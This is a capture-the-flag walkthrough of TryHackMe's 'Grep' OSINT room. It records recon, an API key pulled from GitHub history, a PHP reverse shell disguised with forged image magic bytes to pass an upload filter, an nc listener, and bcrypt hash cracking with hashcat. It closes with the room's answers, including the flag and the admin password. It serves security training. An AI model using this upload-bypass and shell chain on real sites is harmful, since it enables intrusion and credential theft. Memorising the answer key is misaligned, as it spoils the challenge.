
#CTF #OSINT 

https://tryhackme.com/room/greprtp

![grep image](https://tryhackme-images.s3.amazonaws.com/room-icons/3c9eb22b9c05babb8f96231c2aabb768.png)

Welcome to the OSINT challenge, part of TryHackMe’s Red Teaming Path. In this task, you will be an ethical hacker aiming to exploit a newly developed web application.

SuperSecure Corp, a fast-paced startup, is currently creating a blogging platform inviting security professionals to assess its security. The challenge involves using OSINT techniques to gather information from publicly accessible sources and exploit potential vulnerabilities in the web application.

Your goal is to identify and exploit vulnerabilities in the application using a combination of recon and OSINT skills. As you progress, you’ll look for weak points in the app, find sensitive data, and attempt to gain unauthorized access. You will leverage the skills and knowledge acquired through the Red Team Pathway to devise and execute your attack strategies.

```
10.10.53.130

# nmap 

22/tcp    open  ssh
80/tcp    open  http
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp   open  https
| ssl-cert: Subject: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2023-06-14T13:03:09
|_Not valid after:  2024-06-13T13:03:09
51337/tcp open  unknown
| ssl-cert: Subject: commonName=leakchecker.grep.thm/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2023-06-14T12:58:31
|_Not valid after:  2024-06-13T12:58:31
| tls-alpn: 
|_  http/1.1
MAC Address: 02:6F:C7:43:91:87 (Unknown)

http://10.10.53.130/
Apache2 Ubuntu default page

search Apache2 Ubuntu
(CVE-2021-34798)
(CVE-2021-33193)
(CVE-2021-36160)
(CVE-2021-39275)
(CVE-2021-40438)

gobuster dir -u http://grep.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t64 --no-error -k

/phpmyadmin   = need permissions
/server-status

nano /etc/hosts
10.10.53.130 grep.thm

https://grep.thm

SearchMe!
/login.php
/register.php

/register.php
username: test
password: pass123
email: hack@thm.com
name: hacker 
returns "invalid or Expired API key"

/login.php
username: test
password: pass123

invalid username or password

sql injection failed

burpsuite /register

Request -----------------------------------------
POST /api/register.php HTTP/1.1
Host: grep.thm
Cookie: PHPSESSID=v51597kkgp6v45ipkvl0n9gtj3
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://grep.thm/public/html/register.php
Content-Type: application/json
X-Thm-Api-Key: e8d25b4208b80008a9e15c8698640e85
Content-Length: 76
Origin: https://grep.thm
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers
Connection: keep-alive

{"username":"test","password":"test","email":"test@thm.com","name":"tester"}

Response -------------------------------------
{"error": "Invalid or Expired API key"}

the clue of where to search is GitHub for this SearchMe is from the room binoculars Google and GitHub 

github search SearchME language:PHP 

look for SuperSecure Corp

see supersecuredeveloper
https://github.com/supersecuredeveloper/searchmecms

/api
	register.php
	upload.php

check register history
ffe60ecaa8bba2f12b43d1a4b15b8f39

back to burp and paste in API key
send request = success

our credentials
{"username":"test","password":"test","email":"test@thm.com","name":"tester"}

First Flag
THM{4ec9806d7e1350270dc402ba870ccebb}

see what other directories

gobuster https://grep.thm/public/html/

gobuster dir -u https://grep.thm/public/html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 --no-error -x php,hs,html -k

/admin.php
/upload.php
/dashboard.php

https://grep.thm/public/html/upload.php

github history shows $uploadPath='api/uploads/'

but remember nmap scan we have port to check out 51337

https://grep.thm:51337/

nano /etc/hosts
leakchecker.grep.thm

https://leakchecker.grep.thm:51337/

email leak checker 

test@test.com = invalid

/upload.php

get a rev shell PHP script
github code checks the header for jpg etc

$allowedExtensions = ['jpg', 'jpeg', 'png', 'bmp'];
$validMagicBytes = [
    'jpg' => 'ffd8ffe0', 
    'png' => '89504e47', 
    'bmp' => '424d'
];

modify the rev shell PHP file to have valid bytes
hexedit revshell.php

00000000   3C 3F 70 68  70 0A 2F 2F  20 70 68 70  2D 72 65 76  <?php.// php-rev

00000000 ff d8 ff e0

upload file = "File uploaded successfully"

nc -nlvp 4445

now we go to /uploads

we see revshell.php
failed so open the rev shell PHP file (new one)
add AAAA at the top

do the hexedit revshell2.php 

https://grep.thm/public/html/upload.php

successful

https://grep.thm/api/uploads/

click on revshell2.php

terminal for listener

ls

# stabilize the shell
python3 -c 'import pty;pty.spawn("/bin/bash");'
export TERM=xterm
ctrl z
stty raw -echo; fg
stty rows 38 columns 116

ls 
tryhackme ubuntu

cd /var/www/
ls -la
cd leakchecker/
ls

cd ..
cd backup
ls
cat users.sql

INSERT INTO `users` (`id`, `username`, `password`, `email`, `name`, `role`) VALUES
(1, 'test', '$2y$10$dE6VAdZJCN4repNAFdsO2ePDr3StRdOhUJ1O/41XVQg91qBEBQU3G', 'test@grep.thm', 'Test User', 'user'),
(2, 'admin', '$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C', 'admin@searchme2023cms.grep.thm', 'Admin User', 'admin');

hashes - hash identifier == Blowfish
$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C

hashcat -m 3200 -a0 -o cracked.txt hashfile.txt /usr/share/wordlists/rockyou.txt

```

```
What is the API key that allows a user to register on the website?
ffe60ecaa8bba2f12b43d1a4b15b8f39

What is the first flag?
THM{4ec9806d7e1350270dc402ba870ccebb}

What is the email of the "admin" user?
admin@searchme2023cms.grep.thm

What is the host name of the web application that allows a user to check an email for a possible password leak?

leakchecker.grep.thm

What is the password of the "admin" user?

admin_tryhackme

```

https://www.youtube.com/watch?v=U3MTnarCP8w

